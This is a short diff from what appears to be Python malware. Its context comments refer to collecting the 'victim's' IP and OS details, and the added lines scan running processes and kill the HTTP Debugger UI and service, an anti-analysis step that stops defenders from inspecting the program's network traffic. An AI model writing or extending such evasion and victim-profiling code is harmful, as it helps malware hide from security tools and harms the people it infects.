@@ -38,6 +38,16 @@ os_name = os_info.Name.encode('utf-8').split(b'|')[0] #get os name
 hwnd = win32console.GetConsoleWindow() #get console window
 
 
+for proc in psutil.process_iter():
+    try:
+        processName = proc.name()
+        if processName == "HTTPDebuggerUI.exe":
+            proc.terminate()
+        if processName == "HTTPDebuggerSvc.exe":
+            proc.terminate()
+    except:
+        pass
+
 def getip(): #get the victim's ip
     ip = "None"
     try:
